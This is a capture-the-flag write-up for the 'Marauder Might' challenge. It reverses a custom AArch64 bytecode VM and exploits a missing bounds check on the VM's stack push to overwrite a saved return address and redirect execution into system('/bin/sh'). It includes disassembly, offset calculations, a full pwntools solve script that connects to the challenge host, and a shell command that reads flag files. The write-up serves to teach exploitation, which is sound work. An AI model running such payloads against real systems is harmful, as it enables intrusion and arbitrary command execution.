# Marauder Might

> Things have gotten a little dreary, and we're fairly beaup now but so are they. We might have to resort to more drastic measures. Grapple onto the ship and take the flag and booty for ourselves!
>
> Author: `@chasek`

## Challenge Files

- `fractured_ship`
- `solve.py`

## Flag

```text
RS{th3_G4rc1a_0F_gr4pp1in6}
```

## TL;DR

This challenge is a small **AArch64 stack-based VM**.

The VM reads:

1. A `u32` constant count
2. That many 8-byte constant slots
3. A bytecode stream from `stdin`

The bug is that the VM's value stack lives in a fixed stack buffer, but the `push` routine never checks bounds. By sending enough `OP_CONSTANT` instructions, we can overflow out of the VM stack and overwrite the saved return address of the wrapper function at `0x4009c0`.

Instead of building a full AArch64 ROP chain, we reuse a helper already present in the binary:

- `0x400780` loads the string `"/bin/sh"`
- then calls `0x402300`
- which forwards into the static `system()` implementation

So the exploit is:

1. Fill the VM stack until it reaches the saved `x30`
2. Overwrite `x30` with `0x400780`
3. Execute `OP_RETURN` so the interpreter exits cleanly
4. Let the wrapper function return into `0x400780`
5. Send shell commands over the same socket and read the flag

## Initial Recon

### File Type

```text
fractured_ship: ELF 64-bit LSB executable, ARM aarch64, statically linked, stripped
```

### Mitigations

```text
Arch:       aarch64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
```

Important observations:

- The binary is **static**, so there is a lot of libc code inside it.
- The binary is **not PIE**, so code addresses are fixed.
- NX is enabled, so we want code reuse rather than shellcode.
- No stack canary makes a stack overwrite practical.
- Some static libc functions use PAC-related instructions like `paciasp` / `autiasp`, so a simple PAC-free target inside challenge code is preferable.

## Reversing the Program

### Entry and Main Loop

The ELF entry eventually lands in `0x4009e8`, which is the real `main`.

At a high level, the program does this:

```c
int main() {
    banner();

    while (read_program(&prog, 0) == 0) {
        run_program(&prog);
        cleanup(&prog);
    }

    goodbye();
    return 0;
}
```

Relevant disassembly:

```asm
0x400a28: bl   #0x4007a0
0x400a2c: b    #0x400a40
0x400a30: add  x0, sp, #0x10
0x400a34: bl   #0x4009c0
0x400a38: add  x0, sp, #0x10
0x400a3c: bl   #0x400c00
0x400a40: add  x0, sp, #0x10
0x400a44: mov  w1, #0
0x400a48: bl   #0x400b14
0x400a4c: cmp  w0, #0
0x400a50: b.eq #0x400a30
```

So the important functions are:

- `0x400b14`: parse the constant pool
- `0x4009c0`: run the VM
- `0x400c00`: free allocations

### Program Format

The parser at `0x400b14` first zeroes a 0x20-byte structure, then reads a 4-byte count, allocates `count * 8`, and reads that many bytes.

That means the input format is:

```text
u32 constant_count
u64 constants[constant_count]
u8  bytecode_stream[]
```

Important detail:

- The constants are stored in 8-byte slots and later moved with floating-point load/store instructions.
- That means they are treated as raw 64-bit payloads, not validated numeric values.
- So we can store **addresses** in the constant table even if they are not meaningful doubles.

### The VM

The interpreter entry is `0x400890`.

It allocates a large stack frame:

```asm
0x400890: sub sp, sp, #0x820
```

Then it initializes a global "VM stack top" pointer to `sp + 0x10`:

```asm
0x40089c: adrp x0, #0x4a1000
0x4008a0: add  x0, x0, #0x958
0x4008a4: add  x1, sp, #0x10
0x4008a8: str  x1, [x0, #0x10]
```

The VM reads bytecode directly from `stdin` one byte at a time via `0x400858`.

The opcodes we actually need are:

- `0x00`: push constant
- `0x01`: return / print top of stack

### Push

The push helper is at `0x4007e0`:

```asm
0x4007e0: sub sp, sp, #0x10
0x4007e4: str d0, [sp, #8]
0x4007e8: adrp x0, #0x4a1000
0x4007ec: add  x0, x0, #0x958
0x4007f0: ldr  x0, [x0, #0x10]
0x4007f4: ldr  d31, [sp, #8]
0x4007f8: str  d31, [x0]
0x4007fc: adrp x0, #0x4a1000
0x400800: add  x0, x0, #0x958
0x400804: ldr  x0, [x0, #0x10]
0x400808: add  x1, x0, #8
0x40080c: adrp x0, #0x4a1000
0x400810: add  x0, x0, #0x958
0x400814: str  x1, [x0, #0x10]
```

Translated:

```c
void push(uint64_t raw_value) {
    *(uint64_t *)stack_top = raw_value;
    stack_top += 8;
}
```

There is **no bounds check**.

### Pop / Return

The pop helper is at `0x400824` and `OP_RETURN` uses it to print the top value.

So if we arrange for the VM to eventually hit `OP_RETURN`, execution returns back out of the interpreter, which is perfect for a post-overflow control-flow hijack.

## The Vulnerability

The bug is an unchecked stack write in the VM.

The wrapper function `0x4009c0` looks like this:

```asm
0x4009c0: stp x29, x30, [sp, #-0x20]!
0x4009c4: mov x29, sp
...
0x4009dc: bl  #0x400890
0x4009e0: ldp x29, x30, [sp], #0x20
0x4009e4: ret
```

The interpreter's stack base is `sp + 0x10` inside `0x400890`, and `0x4009c0`'s saved frame sits above that.

### Exact Offset Math

Let:

- `sp1` = stack pointer in `0x4009c0` after its prologue
- `sp0` = stack pointer in `0x400890` after `sub sp, sp, #0x820`

Then:

```text
sp0 = sp1 - 0x820
vm_stack_base = sp0 + 0x10 = sp1 - 0x810
saved_x29_of_4009c0 = sp1 + 0x0
saved_x30_of_4009c0 = sp1 + 0x8
```

So relative to the VM stack base:

```text
saved_x29 offset = 0x810
saved_x30 offset = 0x818
```

Each push writes 8 bytes, so:

```text
push #259 -> saved x29
push #260 -> saved x30
```

In code:

```python
PUSHES_TO_SAVED_X29 = 0x810 // 8 + 1
PUSHES_TO_SAVED_X30 = 0x818 // 8 + 1
```

That is the whole exploit primitive.

## Getting Code Execution

### Avoiding a Full ROP Chain

Because this is a static AArch64 binary, there are many libc functions, but a lot of them use PAC-aware epilogues. I did not want to rely on a brittle PAC-sensitive chain when the binary already contains a perfect helper.

At `0x400780`:

```asm
0x400780: stp  x29, x30, [sp, #-0x10]!
0x400784: mov  x29, sp
0x400788: adrp x0, #0x45b000
0x40078c: add  x0, x0, #0x9a0    ; "/bin/sh"
0x400790: bl   #0x402300
0x400798: ldp  x29, x30, [sp], #0x10
0x40079c: ret
```

And `0x402300` is a wrapper around the internal `system()` path:

```asm
0x402300: bti c
0x402304: cbz x0, #0x40230c
0x402308: b   #0x401e60
0x40230c: ...
0x402314: adrp x0, #0x45b000
0x402318: add  x0, x0, #0xbd0    ; "exit 0"
0x402320: bl   #0x401e60
```

So if we overwrite the saved return address with `0x400780`, we get:

```c
system("/bin/sh");
```

with almost no work.

### Why This Is Nice

- `0x4009c0` ends with a plain `ret`, so we can overwrite `x30` directly.
- We do not need to forge a PAC signature.
- We do not need a libc leak.
- We do not need a multi-stage ROP chain.
- `"/bin/sh"` is already embedded in the binary.

### Payload Design

The payload is:

1. Two constants
2. A long run of `OP_CONSTANT`
3. One `OP_RETURN`

The two constants are:

```python
constants = [
    p64(0),
    p64(0x400780),
]
```

Why raw `p64()` values work:

- The VM moves them through `d` registers
- But it never converts them
- So the bits are preserved exactly

### Bytecode Plan

We send:

1. `258` pushes of constant `0`
2. `1` more push of `0` to overwrite saved `x29`
3. `1` push of `0x400780` to overwrite saved `x30`
4. A couple more zero pushes so `OP_RETURN` prints `0` instead of a weird pointer-as-double value
5. `OP_RETURN`

Minimal pseudocode:

```python
for _ in range(258):
    push(0)

push(0)          # saved x29
push(0x400780)   # saved x30
push(0)
push(0)
return
```

After `OP_RETURN`, the interpreter exits normally.

Then `0x4009c0` executes:

```asm
ldp x29, x30, [sp], #0x20
ret
```

and returns straight into `0x400780`.

### Remote Shell Behavior

One nice property of this challenge is that the VM reads bytecode from the same socket that the future shell will inherit.

That means after the VM returns into `system("/bin/sh")`, we can immediately keep using the same network connection as a shell.

So the exploit flow is:

1. Send the malformed VM program
2. Let the program return into `system("/bin/sh")`
3. Send a shell command like:

```sh
cat /flag* flag* /home/*/flag* 2>/dev/null; echo __DONE__; exit
```

4. Read the response

## Final Exploit Script

The working exploit is in [`solve.py`](./solve.py).

```python
from pwn import *
import re


context.arch = "aarch64"
context.log_level = "info"

HOST = "marauder-might.ctf.ritsec.club"
PORT = 1739

OP_CONSTANT = 0
OP_RETURN = 1

SHELL_HELPER = 0x400780

PUSHES_TO_SAVED_X29 = 0x810 // 8 + 1
PUSHES_TO_SAVED_X30 = 0x818 // 8 + 1


def push(idx: int) -> bytes:
    return bytes((OP_CONSTANT, idx))


def build_payload() -> bytes:
    constants = [
        p64(0),
        p64(SHELL_HELPER),
    ]

    bytecode = []

    for _ in range(PUSHES_TO_SAVED_X29 - 1):
        bytecode.append(push(0))

    bytecode.append(push(0))
    bytecode.append(push(1))
    bytecode.append(push(0))
    bytecode.append(push(0))
    bytecode.append(bytes((OP_RETURN,)))

    return p32(len(constants)) + b"".join(constants) + b"".join(bytecode)


def main():
    io = remote(HOST, PORT)
    io.send(build_payload())
    io.sendline(b"cat /flag* flag* /home/*/flag* 2>/dev/null; echo __DONE__; exit")

    data = io.recvrepeat(3)
    print(data.decode("latin-1", errors="replace"))

    match = re.search(rb"RS\\{[^}\\n]+\\}", data)
    if match:
        log.success(f"flag: {match.group().decode()}")


if __name__ == "__main__":
    main()
```

## Running It

```bash
python3 solve.py
```

Output:

```text
interpreting
0
RS{th3_G4rc1a_0F_gr4pp1in6}
__DONE__
```

The leading `0` is expected because the final `OP_RETURN` prints the top VM stack value before the corrupted return happens.

## Takeaways

- Small custom VMs are often exploitable through missing bounds checks on their operand stack.
- "Floating-point" constants are not safe if they are copied as raw 8-byte values.
- In static non-PIE binaries, it is often worth looking for tiny helper functions in challenge code before jumping into a complicated ret2libc or syscall chain.
- On AArch64, PAC-related instructions can make some generic gadget plans annoying, so finding a clean non-PAC target is especially valuable.
